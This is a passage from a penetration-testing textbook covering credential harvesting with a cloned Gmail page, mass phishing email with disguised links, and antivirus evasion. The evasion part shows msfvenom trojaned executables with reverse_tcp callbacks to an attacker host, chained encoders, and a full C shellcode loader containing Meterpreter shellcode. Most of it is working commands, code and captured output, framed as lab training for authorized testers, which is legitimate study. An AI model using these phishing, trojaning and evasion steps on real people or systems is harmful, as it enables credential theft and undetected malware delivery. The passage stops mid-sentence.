192.168.20.9:443\n[*] Starting the payload handler... Listing 11-10: Setting up a listener\nNow we wait for a curious user to open our malicious PDF and send us\na session. Use ctrl-C to close the listener and type exit to move back to the\nprevious menu. Option 99 will take you back to SET’s Social-Engineering\nAttacks menu. web attacks\nIn this section we’ll look at web-based attacks. Return to the Social-\nEngineering Attacks menu (Listing 11-2), and choose option 2 (Website\nAttack Vectors). This is the sort of attack that I use most often in pentests\nthat have a social-engineering component because it emulates many social-\nengineering attacks seen in the wild. You should be presented with a list of web-based attacks as shown in\nListing 11-11. 1) Java Applet Attack Method\n2) Metasploit Browser Exploit Method\n3) Credential Harvester Attack Method\n4) Tabnabbing Attack Method\n--snip--\n99) Return to Main Menu\nset:webattack> 3\nListing 11-11: SET website attacks\nHere’s a description of some of the attacks:\n• The Java Applet Attack Method automates the Java-signed applet attack\nwe used in Chapter 10. • The Metasploit Browser Exploit Method allows you to use all of\nMetasploit’s browser-exploitation client-side attacks without having\nto set parameters manually, by knowing Metasploit syntax. 250 Chapter 11\n• The Credential Harvester Attack Method helps create websites to trick\nusers into giving up their credentials. • The Tabnabbing Attack Method relies on users’ propensity to build\nup a collection of open browser tabs. When the user first opens the\nattack page, it says “Please wait.” Naturally, the user switches back to\nanother tab while he waits. Once the attack tab is no longer in focus, it\nloads the attack site (which can be a clone of any website you like), with\nthe goal of tricking the user into supplying his credentials or otherwise\ninteracting with the malicious site. The assumption is that the user will\nuse the first tab he encounters that looks legitimate. Choose option 3, the Credential Harvester Attack Method. Next you should see a prompt asking what sort of website you would\nlike. We can choose from some prebuilt web templates, clone a website from\nthe Internet with Site Cloner, or import a custom web page with Custom\nImport. Choose option 1 to use a SET template (see Listing 11-12). 1) Web Templates\n2) Site Cloner\n3) Custom Import\n--snip--\n99) Return to Webattack Menu\nset:webattack> 1\nListing 11-12: SET website template options\nNow enter the IP address for the website to post credentials back to. We\ncan just use the local IP address for the Kali virtual machine, but if you use\nthis attack against a client, you will need an Internet-facing IP address. IP Address for the POST back in Harvester: 192.168.20.9\nNow choose a template. Because we want to trick users into enter-\ning their credentials, choose a template with a login field, such as Gmail\n(option 2), as shown in Listing 11-13. SET should now start a web server\nwith our fake Gmail page, a clone of the actual Gmail page. 1. Java Required\n2. Gmail\n3. Google\n4. Facebook\n5. Twitter\n6. Yahoo\nset:webattack> Select a template: 2\n[*] Cloning the website: https://gmail.com\n[*] This could take a little bit... Social Engineering 251\nThe best way to use this attack is if the username and password form fields\nare available. Regardless, this captures all POSTs on a website. [*] The Social-Engineer Toolkit Credential Harvester Attack\n[*] Credential Harvester is running on port 80\n[*] Information will be displayed to you as it arrives below:\nListing 11-13: Setting up the site\nNow browse to the cloned Gmail site at the Kali Linux web server and\nenter some credentials to see how this works.\n\nAfter entering credentials you\nshould be redirected to the real Gmail site. To a user it will just seem like he\ntyped in his password incorrectly. In the meantime, back in SET, you should\nsee a result that looks something like Listing 11-14.\n\n192.168.20.10 - - [10/May/2015 12:58:02] \"GET / HTTP/1.1\" 200 -\n[*] WE GOT A HIT! Printing the output:\nPARAM: ltmpl=default\n--snip--\nPARAM: GALX=oXwT1jDgpqg\nPOSSIBLE USERNAME FIELD FOUND: Email=georgiau\nPOSSIBLE PASSWORD FIELD FOUND: Passwd=passwordv\n--snip--\nPARAM: asts=\n[*] WHEN YOU'RE FINISHED, HIT CONTROL-C TO GENERATE A REPORT.\nListing 11-14: SET capturing credentials\nWhen the user submits the page, SET highlights the fields that it thinks\nare interesting. In this case, it found the Email u and Passwd v that were\nsubmitted. Once you shut down the web server with ctrl-C to end the web\nattack, the results should be written to a file.\nWhen combined with the email attack discussed next, this is a great\nattack to use to gather credentials for a pentest or, at the very least, test the\nsecurity awareness of your client’s employees.\nNote that this attack can be even more interesting if you use option 5,\nSite Cloner, to make a copy of your customer’s site. If they do not have a\npage with a login form of some sort (VPN, webmail, blogging, and so on)\nyou can even create one. Clone their site, and add a simple HTML form\nlike this:\n<form name=\"input\" action=“index.html\" method=\"post\">\nUsername: <input type=\"text\" name=\"username\"><br>\nPassword: <input type=\"password\" name=\"pwd\"><br>\n<input type=\"submit\" value=\"Submit\"><br>\n</form>\nThen use option 3, Custom Import, to have SET serve your modified page.\n252 Chapter 11\nmass email attacks\nNow to use SET to automate phishing email attacks. Create a file and enter\na few email addresses, one per line, as shown here.\nroot@kali:~# cat emails.txt\ngeorgia@bulbsecurity.com\ngeorgia@grmn00bs.com\ngeorgia@metasploit.com\nNow return to the main SET Social-Engineering Attacks menu with\noption 99 (List ing 11-2) and choose option 5, Mass Mailer Attack. Large car-\nbon copy or blind carbon copy lists can trigger spam filters or tip off users\nthat something is amiss, and emailing a long list of client employees individ-\nually by hand can be tedious, so we’ll use SET to email multiple addresses\n(see Listing 11-15). Scripts are good for repetitive tasks like this.\nset> 5\n1. E-Mail Attack Single Email Address\n2. E-Mail Attack Mass Mailer\n--snip--\n99. Return to main menu.\nset:mailer> 2\n--snip--\nset:phishing> Path to the file to import into SET: /root/emails.txtu\nListing 11-15: Setting up an email attack\nChoose option 2 and enter the name of the email address file to\nimport u.\nNext we need to choose a server (see Listing 11-16). Let’s use Gmail\nagain—option 1. When prompted, enter your credentials.\n1. Use a gmail Account for your email attack.\n2. Use your own server or open relay\nset:phishing> 1\nset:phishing> Your gmail email address: georgia@bulbsecurity.com\nset:phishing> The FROM NAME the user will see: Georgia Weidman\nEmail password:\nset:phishing> Flag this message/s as high priority? [yes|no]: no\nListing 11-16: Logging in to Gmail\nYou should be asked to create the email to send, as shown in Listing 11-17.\nset:phishing> Email subject: Company Web Portal\nset:phishing> Send the message as html or plain? 'h' or 'p': hu\n[!] IMPORTANT: When finished, type END (all capital) then hit {return} on a new line.\nset:phishing> Enter the body of the message, type END (capitals) when finished: All\nSocial Engineering 253\nNext line of the body:\nNext line of the body: We are adding a new company web portal. Please go to <a href=\n\"192.168.20.9\">http://www.bulbsecurity.com/webportal</a> and use your Windows domain\ncredentials to log in.\nNext line of the body:\nNext line of the body: Bulb Security Administrator\nNext line of the body: END\n[*] Sent e-mail number: 1 to address: georgia@bulbsecurity.com\n[*] Sent e-mail number: 2 to address: georgia@grmn00bs.com\n[*] Sent e-mail number: 3 to address: georgia@metasploit.com\n[*] Sent e-mail number: 4 to address:\n[*] SET has finished sending the emails\nPress <return> to continue\nListing 11-17: Sending the email\nWhen asked whether to make the email plaintext or HTML, choose h\nfor HTML u. By using HTML for the email, we’ll be better able to hide the\nreal destination of the links in the email behind graphics and such.\nNow to enter the text for the email. Because we chose HTML as the\nemail format, we can use HTML tags in our email. For example, this code\ncreates a link for the recipient to click: <a href=\"192.168.20.9\">http://www\n.bulbsecurity.com/webportal</a>. The text displayed indicates that the link\ngoes to http://www.bulbsecurity.com/webportal, but the link will really open\n\n192.168.20.9 in the browser. We control the website at 192.168.20.9, so we\ncan put a browser exploit or a phishing attack there. Add some text to the\nemail to convince users to click the included link. This is where you can be\nparticularly creative. For example, in Listing 11-17, we inform the users that\na new company portal has been added, and they should log in with their\ndomain credentials to check it out. On a pentest, a better way to approach\nthis would be to register a variation of the company’s domain name\n(bulb-security.com) or perhaps use a slight misspelling (bulbsecurty.com)\nthat is likely to go unnoticed by users and host your social-engineering\nsite there. After you finish the email, press ctrl-c to send it. The email will be\nsent to each address in the emails.txt file we entered earlier. Recipients will see this email:\nAll,\nWe are adding a new company web portal. Please go to http://\nwww.bulbsecurity.com/webportal and use your Windows domain\ncredentials to log in. Bulb Security Administrator\nWhile a security-savvy user should know better than to click links in\nemails that are not from a trusted source, and would know how to verify\nwhere a link points to before clicking it, not all users are that savvy, and\neven the savvy ones aren’t always paying attention. In fact, I have never\nlaunched a social-engineering test that failed. 254 Chapter 11\nmultipronged attacks\nLet’s combine our previous two attacks (credential harvesting and phishing\nemails) to trick employees into submitting their credentials to a pentester-\ncontrolled site. We’ll use an email attack together with a web attack to send\nusers to our attacker-controlled site by tricking them into clicking links in\nthe emails. But first we need to change an option in SET’s configuration file. In\nKali this file is at /usr/share/set/config/set_config. The option to change is\nWEB_ATTACK_EMAIL, which by default is set to OFF. Open the config file in a text\neditor and change this option to ON. ### Set to ON if you want to use Email in conjunction with webattack\nWEBATTACK_EMAIL=ON\nNow try running the Credential Harvesting attack again. Instead of\nusing a template, you can clone one of your client’s web pages if they have\na login site, such as webmail or an employee portal. If the client uses a web\npage and not a login site, use the Custom Import option to build your own page\nthat looks like the employee’s web page with a login form added. summary\nIn this chapter we’ve looked at only a couple of social-engineering attacks\nthat we can automate with SET. The scripts for your attacks will change\nbased on your clients’ needs. Some clients may have a specific attack sce-\nnario in mind, or you may find the need to run multiple attacks at once. For\ninstance, you may create a multipronged attack where you harvest creden-\ntials and the malicious website runs a malicious Java applet. In addition to\nthe web-based attacks and malicious files we looked at here, SET can cre-\nate other attacks, such as USB sticks, QR codes, and rogue wireless access\npoints. Social Engineering 255\n12\nBYPassing antiVirus\naPPliCations\nYour pentesting clients will most likely be running\nsome sort of antivirus solution. So far in this book\nwe’ve avoided having any of our malicious executables\ndeleted by antivirus applications, but antivirus program\navoidance is a constantly changing field. Typically you\nwill be more likely to avoid detection by using a memory-corruption exploit\nand loading your payload directly into memory—that is, by never touching\nthe disk. That said, with the attack landscape shifting to emphasize client-\nside and social-engineering attacks, it may not always be possible to avoid\nwriting your payload to disk. In this chapter we’ll look at a few techniques\nfor obscuring our malware to try to avoid detection when the payload is\nwritten to the disk. trojans\nIn Chapter 4, we created a standalone malicious executable that runs a\nMetasploit payload. Though we may be able to use social engineering to\ntrick a user into downloading and running our malicious file, the lack of\nany functionality other than our executable’s payload could tip off users\nthat something is amiss. We’d be much more likely to evade detection if we\ncould hide our payload inside of some legitimate program that would run\nnormally, with our payload running in the background. Such a program\nis called a trojan, after the legendary wooden horse that ended the Trojan\nWar. The horse appeared to be an innocuous offering to the gods and was\nbrought inside the previously impenetrable walled city of Troy, with enemy\nsoldiers hiding inside, ready to attack. We encountered a trojan in Chapter 8: The Vsftpd server on our Ubuntu\ntarget had a backdoor that could be triggered at login by entering a smiley\nface as part of the username. Attackers compromised the source code reposi-\ntories for Vsftpd and added additional trojan functionality to the program. Anyone who downloaded Vsftpd from the official repositories between the\ninitial compromise and detection ended up with a trojaned version. Msfvenom\nAlthough reverse-engineering binaries or gaining access to source code\nand manually adding trojan code is beyond the scope of this book, the\nMsfvenom tool has some options we can use to embed a Metasploit payload\ninside a legitimate binary. Listing 12-1 shows some important options we\nhave not encountered previously in the text. root@kali:~# msfvenom -h\nUsage: /opt/metasploit/apps/pro/msf3/msfvenom [options] <var=val>\nOptions:\n-p, --payload [payload] Payload to use. Specify a '-' or stdin to\nuse custom payloads\n--snip--\nu-x, --template [path] Specify a custom executable file to use\nas a template\nv-k, --keep Preserve the template behavior and inject\nthe payload as a new thread\n--snip--\nListing 12-1: Msfvenom help page\nIn particular, the -x flag u allows us to use an executable file as a\ntemplate in which to embed our chosen payload. However, though the\nresulting executable will look like the original one, the added payload will\npause the execution of the original, and we shouldn’t expect a user to run\n258 Chapter 12\nan executable that appears to hang at startup very many times. Luckily,\nMsfvenom’s -k flag v will keep the executable template intact and run our\npayload in a new thread, allowing the original executable to run normally. Let’s use the -x and -k flags to build a trojaned Windows executable\nthat will appear normal to a user but which will send us a Meterpreter ses-\nsion in the background. To do so, we choose the payload with the -p flag\nand set the relevant payload options as in Chapter 4. Any legitimate execut-\nable will do; you’ll find some useful Windows binaries for pentesting in Kali\nLinux at /usr/share/windows-binaries. To embed our payload inside the radmin.exe binary enter:\nroot@kali:~# msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.20.9\nLPORT=2345 -x /usr/share/windows-binaries/radmin.exe -k -f exe > radmin.exe\nOur Msfvenom command specifies the payload to generate with the\n-p option. We set the LHOST option to the IP address of Kali, the system to\ncall back to when the payload runs. We can also set the LPORT option. As\ndiscussed in this section, the -x option selects an executable in which to\nembed our payload. The -k option runs the payload in a separate thread. The -f flag tells Msfvenom to build the payload in the executable format. Once created, run the trojaned binary on either the Windows XP or\nWindows 7 target. The Radmin Viewer program should appear to run\nnormally (Figure 12-1), but the embedded payload should give us a Meter-\npreter session if we set up a handler using the multi/handler module. Figure 12-1: Trojaned Radmin Viewer executable\nBypassing Antivirus Applications 259\nCHeCking for troJans witH tHe mD5 HasH\nOur trojaned binary should convince the average user that the program is legiti-\nmate . Security-savvy users should verify the integrity of a downloaded file before\nrunning it by checking its MD5 hash against the value published by the vendor,\nwhere available . An MD5 hash is a kind of file fingerprint; if changes are made\nto the file, the MD5 hash will change . Let’s compare the MD5 hashes of the original radmin.exe with our trojaned\nversion . In Kali Linux, the md5sum program will calculate a file’s MD5 hash . Run\nmd5sum on both binaries, and you’ll find that the hash values are dramatically\ndifferent, as you can see here at u and v . root@kali:~# md5sum /usr/share/windows-binaries/radmin.exe\nu2d219cc28a406dbfa86c3301e8b93146 /usr/share/windows-binaries/radmin.exe\nroot@kali:~# md5sum radmin.exe\nv4c2711cc06b6fcd300037e3cbdb3293b radmin.exe\nHowever, the MD5 hashing algorithm is not perfect, and a tampered\nbinary could have the same MD5 hash as the original file, which is known as\nan MD5 collision attack . For this reason, many vendors publish a Secure Hash\nAlgorithm (SHA) hash as well . Of course, checking two separate hash values is better than checking one . The SHA family contains multiple hashing algorithms, and the version used will\nvary among vendors . Kali comes with programs for various SHA hashes . For\nexample, sha512sum calculates the 64-bit block size SHA-2 hash, as shown here . root@kali:~# sha512sum /usr/share/windows-binaries/radmin.exe\n5a5c6d0c67877310d40d5210ea8d515a43156e0b3e871b16faec192170acf29c9cd4e495d2e03b8d\n7ef10541b22ccecd195446c55582f735374fb8df16c94343 /usr/share/windows-binaries/\nradmin.exe\nroot@kali:~# sha512sum radmin.exe\nf9fe3d1ae405cc07cd91c461a1c03155a0cdfeb1d4c0190be1fb350d43b4039906f8abf4db592b060\nd5cd15b143c146e834c491e477718bbd6fb9c2e96567e88 radmin.exe\nWhen installing software, be sure to calculate the hash(es) of your down-\nloaded version, and compare it to the value(s) published by the vendor . how antivirus applications work\nBefore we try different techniques to get our Metasploit payloads past an\nantivirus program, let’s discuss how these programs work. Most antivirus\nsolutions start by comparing potentially dangerous code to a set of patterns\nand rules that make up the antivirus definitions, which match known mali-\ncious code. Antivirus definitions are updated regularly as new malware is\nidentified by each vendor. This sort of identification is called static analysis. 260 Chapter 12\nIn addition to static analysis against a set of signatures, more advanced\nantivirus solutions also test for malicious activity, called dynamic analysis. For\nexample, a program that tries to replace every file on the hard drive or con-\nnects to a known botnet command and control server every 30 seconds is\nexhibiting potentially malicious activity and may be flagged. note Some antivirus products, such as Google’s Bouncer, run new apps that are uploaded\nto the Google Play store and pass static analysis in an isolated sandbox to try to detect\nmalicious activity that doesn’t have a known malicious signature. microsoft security essentials\nAs we use different methods in this section to bring down our detection\nrate, keep in mind that even if you not able to get a 0 percent detection\nrate among all antivirus vendors, if you know which antivirus solution\nis deployed in your client’s environment, you can focus your efforts on\nclearing just that antivirus program. In this chapter, we will try to bypass\nMicrosoft Security Essentials using various methods. When we created our Windows 7 target in Chapter 1, we installed\nMicrosoft Security Essentials, but we didn’t turn on real-time protection to\nscan files as they are downloaded or installed. Now let’s turn on this protec-\ntion to see if we can create an undetectable trojan. Open Microsoft Security\nEssentials, select the Settings tab, choose Real-time protection, and check\nthe box to turn on the service, as shown in Figure 12-2. Click Save changes.\n\nFigure 12-2: Microsoft Security Essentials real-time protection\nBypassing Antivirus Applications 261\nAs of this writing, even free antivirus solutions like Microsoft Security\nEssentials do a good job of catching Metasploit payloads. For a real test, try\ninstalling the trojaned radmin.exe with real-time protection turned on. You\nshould see a pop-up at the bottom-right corner of the screen, like the one\nshown in Figure 12-3. The file is automatically deleted before the user can\nrun it—that certainly puts a damper on things. Figure 12-3: Malicious software detected\nVirustotal\nOne way to see which antivirus solutions will flag a program as malicious is\nto upload the file in question to the VirusTotal website (https://www.virustotal\n.com/). As of this writing, VirusTotal scans uploaded files with 51 antivirus\nprograms and reports which ones detect malware. VirusTotal is shown in\nFigure 12-4. Figure 12-4: VirusTotal\nTo see which antivirus programs detect our trojaned radmin.exe as\ncurrently written, upload the file to VirusTotal and click Scan it!. Because\nantivirus definitions are constantly updated, your results will differ, but as\nyou can see in Fig ure 12-5, 25 of 51 scanners detected our file as malicious. (The bottom of the page shows which scanners detected the malware.)\n262 Chapter 12\nFigure 12-5: Trojaned binary antivirus detection\nnote VirusTotal shares uploaded binaries with antivirus vendors so they can write sig-\nnatures to match. Antivirus companies use VirusTotal signatures to improve their\ndetection engines, so anything you upload to the site may be caught by antivirus soft-\nware just because you uploaded it. To avoid that risk, you can install the antivirus\nproduct on a virtual machine and test your trojans manually against it, as we did in the\nprevious section. getting Past an antivirus Program\nClearly if we want to get past antivirus solutions, we need to try harder to\nhide. Let’s look at some other useful ways to hide our Metasploit payloads\nbesides simply placing them inside of an executable. Encoding\nEncoders are tools that allow you to avoid characters in an exploit that\nwould break it. (You’ll learn more about these requirements when we write\nour own exploits in Chapters 16 through 19.) At the time of this writing,\nMetasploit supports 32 encoders. Encoders mangle the payload and pre-\npend decoding instructions to be executed in order to decode the payload\nbefore it is run. It is a common misperception that Metasploit’s encoders\nwere designed to help bypass antivirus programs. Some Metasploit encod-\ners create polymorphic code, or mutating code, which ensures that the\nencoded payload looks different each time the payload is generated. This\nprocess makes it more difficult for antivirus vendors to create signatures\nfor the payload, but as we will see, it is not enough to bypass most antivirus\nsolutions. Bypassing Antivirus Applications 263\nTo list all of the encoders available in Msfvenom, use the -l encoders\noption, as shown in Listing 12-2. root@kali:~# msfvenom -l encoders\nFramework Encoders\n==================\nName Rank Description\n---- ---- -----------\ncmd/generic_sh good Generic Shell Variable Substitution Command Encoder\ncmd/ifs low Generic ${IFS} Substitution Command Encoder\n--snip—\nux86/shikata_ga_nai excellent Polymorphic XOR Additive Feedback Encoder\n--snip--\nListing 12-2: Msfvenom encoders\nThe only encoder with an excellent rank is x86/shikata_ga_nai u. Shikata Ga Nai is Japanese for “It can’t be helped.” Encoder rankings are\nbased on the entropy level of the output. With shikata_ga_nai, even the\ndecoder stub is polymorphic. The nitty-gritty details of how this encoder\nworks are beyond the scope of this book, but suffice it to say that it mangles\npayloads beyond easy recognition. Tell Msfvenom to use the shikata_ga_nai encoder with the -e flag, as\nshown in Listing 12-3. Additionally, for further obfuscation, we’ll run our\npayload through an encoder multiple times, encoding the output from the\nprevious round with the -i flag and specifying the number of encoding\nrounds (10 in this case). root@kali:~# msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.20.9\nLPORT=2345 -e x86/shikata_ga_nai -i 10 -f exe > meterpreterencoded.exe\n[*] x86/shikata_ga_nai succeeded with size 317 (iteration=1)\n[*] x86/shikata_ga_nai succeeded with size 344 (iteration=2)\n--snip--\n[*] x86/shikata_ga_nai succeeded with size 533 (iteration=9)\n[*] x86/shikata_ga_nai succeeded with size 560 (iteration=10)\nListing 12-3: Creating an encoded executable with Msfvenom\nNow upload the resulting binary to VirusTotal. As you can see in Fig-\nure 12-6, 35 of the tested antivirus products detected our payload, even\nwith the encoding. That’s a higher detection rate than we found when\nembedding our payload inside a prebuilt executable. In other words,\nshikata_ga_nai alone doesn’t do the trick. 264 Chapter 12\nFigure 12-6: VirusTotal results for an encoded binary\nTo see if we can improve our results, we can try experimenting with\nusing multiple Metasploit encoders on our payload. For example, we\ncan combine multiple rounds of shikata_ga_nai with another Metasploit\nencoder, x86/bloxor, as shown in Listing 12-4. root@kali:~# msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.20.9\nLPORT=2345 -e x86/shikata_ga_nai -i 10 -f rawu > meterpreterencoded.binv\n[*] x86/shikata_ga_nai succeeded with size 317 (iteration=1)\n--snip--\n[*] x86/shikata_ga_nai succeeded with size 560 (iteration=10)\nroot@kali:~# msfvenom -p -w -f exe -a x86x --platform windowsy -e x86/bloxor\n-i 2 > meterpretermultiencoded.exe < meterpreterencoded.binz\n[*] x86/bloxor succeeded with size 638 (iteration=1)\n[*] x86/bloxor succeeded with size 712 (iteration=2)\nListing 12-4: Multiencoding with Msfvenom\nThis time, we start out with Msfvenom using the windows/meterpreter/\nreverse_tcp payload as usual and encode it with shikata_ga_nai, as in the pre-\nvious example. However, instead of setting the format to .exe, we output in\nraw format u. Also, instead of outputting the results to an .exe file as we did\npreviously, this time we output the raw bytes into a .bin file v. Bypassing Antivirus Applications 265\nNow we take the results of the shikata_ga_nai encoding and encode it\nwith the x86/bloxor encoder. Our syntax for Msfvenom will differ from what\nwe are used to. First, we set the payload to null with the option -p - w. And,\nbecause we are not setting a payload, we need to tack on two new options to\ntell Msfvenom how to encode our input: -a x86 x to specify the architecture\nas 32 bit, and --platform windows y to specify the Windows platform. Finally,\nat the end of the Msfvenom command, we use the < symbol to pipe the .bin\nfile from the previous command as input into Msfvenom z. The resulting\nexecutable will be encoded with shikata_ga_nai and x86/bloxor. The resulting executable is detected by 33 antivirus programs on\nVirusTotal as of this writing—slightly better than shikata_ga_nai by itself. You may be able to improve your results by experimenting with different\nsets of encoders and chaining more than two encoders together, or by com-\nbining techniques. For example, what if we both embed our payload in a\nbinary and encode it with shikata_ga_nai as shown here? root@kali:~# msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.20.9\nLPORT=2345 -x /usr/share/windows-binaries/radmin.exe -k -e x86/shikata_ga_nai\n-i 10 -f exe > radminencoded.exe\nThis gave only a slight improvement: The payload was detected by\n21 antivirus programs. And, unfortunately, Microsoft Security Essentials\nflagged both executables as malicious, as shown in Figure 12-7. We need to\nlook beyond Metasploit encoders if we’re going to get past antivirus detec-\ntion on our Windows 7 target. Figure 12-7: Microsoft is still flagging this binary as malicious. Custom Cross Compiling\nAs the de facto standard for penetration testing, Metasploit gets a fair\namount of attention from antivirus vendors who make detecting the sig-\nnatures for payloads generated by Msfvenom a priority. When Msfvenom\ncreates an executable, it uses prebuilt templates that antivirus vendors can\nuse to build detection signatures. Perhaps we can improve our ability to bypass antivirus solutions by com-\npiling an executable ourselves using raw shellcode. Let’s start with a simple\n266 Chapter 12\nC template, as shown in Listing 12-5. (We discussed the basics of C pro-\ngramming in Chapter 3. Review that section if this program doesn’t make\nsense to you.) Save this code to a file called custommeterpreter.c. #include <stdio.h>\nunsigned char random[]= u\nunsigned char shellcode[]= v\nint main(void) w\n{\n((void (*)())shellcode)();\n}\nListing 12-5: Custom executable template\nWe need to fill in data for the variables random u and shellcode v, which\nare both unsigned character arrays. Our hope is that adding some random-\nness and compiling our own C code will be enough to trick antivirus pro-\ngrams. The random variable will introduce some randomness to the template. The shellcode variable will hold the raw hexadecimal bytes of the payload we\ncreate with Msfvenom. The main function w runs when our compiled C pro-\ngram starts and executes our shellcode. Create your payload in Msfvenom as usual, except this time set the for-\nmat with the -f flag to c, as shown in Listing 12-6. This will create hex bytes\nthat we can drop into our C file. root@kali:~# msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.20.9\nLPORT=2345 -f c -e x86/shikata_ga_nai -i 5\nunsigned char buf[] =\n\"\\xfc\\xe8\\x89\\x00\\x00\\x00\\x60\\x89\\xe5\\x31\\xd2\\x64\\x8b\\x52\\x30\"\n\"\\x8b\\x52\\x0c\\x8b\\x52\\x14\\x8b\\x72\\x28\\x0f\\xb7\\x4a\\x26\\x31\\xff\"\n--snip--\n\"\\x00\\x56\\x53\\x57\\x68\\x02\\xd9\\xc8\\x5f\\xff\\xd5\\x01\\xc3\\x29\\xc6\"\n\"\\x85\\xf6\\x75\\xec\\xc3\";\nListing 12-6: Creating a raw payload in C format\nFinally, we need to add some randomness. A good place to find ran-\ndomness on a Linux system is in the /dev/urandom file. This file is specifically\ndesigned as a pseudorandom number generator; it generates data using\nentropy in the Linux system. But if we just cat out data from /dev/urandom, we’ll get a lot of unprint-\nable characters. To get the proper data for a character array, we’ll use the tr\nLinux utility to translate the /dev/urandom data to printable characters. Use\ntr -dc A-Z-a-z-0-9, and then pipe the commands into the head command to\noutput only the first 512 characters from /dev/urandom, as shown here.\n\nroot@kali:~# cat /dev/urandom | tr -dc A-Z-a-z-0-9 | head -c512\ns0UULfhmiQGCUMqUd4e51CZKrvsyIcLy3EyVhfIVSecs8xV-JwHYlDgfiCD1UEmZZ2Eb6G0no4qjUI\nIsSgneqT23nCfbh3keRfuHEBPWlow5zX0fg3TKASYE4adL\n--snip--\nBypassing Antivirus Applications 267\nNow drop the data from /dev/urandom into the random variable in the\nC file. The finished file is shown in Listing 12-7. (Of course, your random-\nness and encoded payload will differ.) Be sure to surround the string with\nquotes and use a semicolon (;) at the end. #include <stdio.h>\nunsigned char random[]= \"s0UULfhmiQGCUMqUd4e51CZKrvsyIcLy3EyVhfIVSecs8xV-JwHYlDgfiCD1UEmZZ2Eb6G\n0no4qjUIIsSgneqT23nCfbh3keRfuHEBPWlow5zX0fg3TKASYE4adLqB-3X7MCSL9SuqlChqT6zQkoZNvi9YEWq4ec8\n-ajdsJW7s-yZOKHQXMTY0iuawscx57e7Xds15GA6rGObF4R6oILRwCwJnEa-4vrtCMYnZiBytqtrrHkTeNohU4gXcVIem\n-lgM-BgMREf24-rcW4zTi-Zkutp7U4djgWNi7k7ULkikDIKK-AQXDp2W3Pug02hGMdP6sxfR0xZZMQFwEF-apQwMlog4Trf\n5RTHFtrQP8yismYtKby15f9oTmjauKxTQoJzJD96sA-7PMAGswqRjCQ3htuWTSCPleODITY3Xyb1oPD5wt-G1oWvavrpewe\nLERRN5ZJiPEpEPRTI62OB9mIsxex3omyj10bEha43vkerbN0CpTyernsK1csdLmHRyca\";\nunsigned char shellcode[]= \"\\xfc\\xe8\\x89\\x00\\x00\\x00\\x60\\x89\\xe5\\x31\\xd2\\x64\\x8b\\x52\\x30\"\n\"\\x8b\\x52\\x0c\\x8b\\x52\\x14\\x8b\\x72\\x28\\x0f\\xb7\\x4a\\x26\\x31\\xff\"\n\"\\x31\\xc0\\xac\\x3c\\x61\\x7c\\x02\\x2c\\x20\\xc1\\xcf\\x0d\\x01\\xc7\\xe2\"\n\"\\xf0\\x52\\x57\\x8b\\x52\\x10\\x8b\\x42\\x3c\\x01\\xd0\\x8b\\x40\\x78\\x85\"\n\"\\xc0\\x74\\x4a\\x01\\xd0\\x50\\x8b\\x48\\x18\\x8b\\x58\\x20\\x01\\xd3\\xe3\"\n\"\\x3c\\x49\\x8b\\x34\\x8b\\x01\\xd6\\x31\\xff\\x31\\xc0\\xac\\xc1\\xcf\\x0d\"\n\"\\x01\\xc7\\x38\\xe0\\x75\\xf4\\x03\\x7d\\xf8\\x3b\\x7d\\x24\\x75\\xe2\\x58\"\n\"\\x8b\\x58\\x24\\x01\\xd3\\x66\\x8b\\x0c\\x4b\\x8b\\x58\\x1c\\x01\\xd3\\x8b\"\n\"\\x04\\x8b\\x01\\xd0\\x89\\x44\\x24\\x24\\x5b\\x5b\\x61\\x59\\x5a\\x51\\xff\"\n\"\\xe0\\x58\\x5f\\x5a\\x8b\\x12\\xeb\\x86\\x5d\\x68\\x33\\x32\\x00\\x00\\x68\"\n\"\\x77\\x73\\x32\\x5f\\x54\\x68\\x4c\\x77\\x26\\x07\\xff\\xd5\\xb8\\x90\\x01\"\n\"\\x00\\x00\\x29\\xc4\\x54\\x50\\x68\\x29\\x80\\x6b\\x00\\xff\\xd5\\x50\\x50\"\n\"\\x50\\x50\\x40\\x50\\x40\\x50\\x68\\xea\\x0f\\xdf\\xe0\\xff\\xd5\\x97\\x6a\"\n\"\\x05\\x68\\x0a\\x00\\x01\\x09\\x68\\x02\\x00\\x09\\x29\\x89\\xe6\\x6a\\x10\"\n\"\\x56\\x57\\x68\\x99\\xa5\\x74\\x61\\xff\\xd5\\x85\\xc0\\x74\\x0c\\xff\\x4e\"\n\"\\x08\\x75\\xec\\x68\\xf0\\xb5\\xa2\\x56\\xff\\xd5\\x6a\\x00\\x6a\\x04\\x56\"\n\"\\x57\\x68\\x02\\xd9\\xc8\\x5f\\xff\\xd5\\x8b\\x36\\x6a\\x40\\x68\\x00\\x10\"\n\"\\x00\\x00\\x56\\x6a\\x00\\x68\\x58\\xa4\\x53\\xe5\\xff\\xd5\\x93\\x53\\x6a\"\n\"\\x00\\x56\\x53\\x57\\x68\\x02\\xd9\\xc8\\x5f\\xff\\xd5\\x01\\xc3\\x29\\xc6\"\n\"\\x85\\xf6\\x75\\xec\\xc3\";\nint main(void)\n{\n((void (*)())shellcode)();\n}\nListing 12-7: Finished custom C file\nNow we need to compile the C program. We can’t use the built-in\nGCC program because it would compile our program to run on Linux\nsystems, and we want to run it on a 32-bit Windows system. Instead, we’ll\nuse the Mingw32 cross compiler from the Kali Linux repositories , which\nwe installed in Chapter 1. If you haven’t already installed it, install it with\napt-get install mingw32, and then compile your custom C file with i586-min-\ngw32msvc-gcc. (Other than the program name, the syntax for using the cross\ncompiler is the same as for Linux’s built-in GCC, discussed in Chapter 3.)\n268 Chapter 12\nroot@kali:~# i586-mingw32msvc-gcc -o custommeterpreter.exe custommeterpreter.c\nNow upload the resulting executable to VirusTotal. As of this writing,\n18 antivirus products detected the malicious file. That’s an improvement,\nbut Microsoft Security Essentials is still catching our file. We still need to work a little harder to get a malicious executable onto\nour Windows 7 system. (You could have better success with this technique\nwith another cross compiler from another repository.)\nEncrypting Executables with Hyperion\nAnother way to obfuscate our payload is to encrypt it. One executable\nencrypter is Hyperion, which uses Advanced Execution Standard (AES)\nencryption, a current industry standard. After encrypting the executable,\nHyperion throws away the encryption keys. When the executable runs,\nit brute-forces the encryption key to decrypt itself back to the original\nexecutable. If you have any background in cryptography, this process should raise\na lot of red flags. AES is currently considered a secure encryption standard. If the executable doesn’t have access to the encryption key, it should not\nbe able to brute-force the key in any reasonable amount of time, certainly\nnot fast enough for our program to run in the time window of our 